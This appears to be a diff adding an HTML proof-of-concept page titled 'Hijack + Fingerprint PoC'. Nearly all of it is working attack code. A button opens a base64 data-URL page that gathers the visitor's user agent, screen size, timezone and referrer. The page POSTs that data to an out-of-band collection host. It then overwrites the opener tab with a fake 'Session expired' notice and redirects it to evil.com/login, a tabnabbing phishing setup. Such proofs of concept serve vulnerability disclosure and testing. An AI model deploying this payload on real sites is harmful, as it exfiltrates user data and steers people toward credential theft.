@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hijack + Fingerprint PoC</title>
+  </head>
+  <body>
+    <button id="steal">ClickMe</button>
+
+    <script>
+      document.getElementById("steal").addEventListener("click", function () {
+        const payload = `
+          <script>
+            // Fingerprint
+            const data = {
+              ua: navigator.userAgent,
+              screen: screen.width + 'x' + screen.height,
+              tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              ref: document.referrer
+            };
+
+            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(data)
+            });
+
+            alert('Fingerprint sent!');
+
+            // Hijack window.opener
+            if (window.opener) {
+              window.opener.document.body.innerHTML = '<h1 style="color:red">Session expired. Please login again.</h1>';
+              window.opener.location = 'https://evil.com/login';
+            }
+          <\/script>
+        `;
+
+        const base64 = btoa(payload);
+        const url = "data:text/html;base64," + base64;
+        window.open(url);
+      });
+    </script>
+  </body>
+</html>
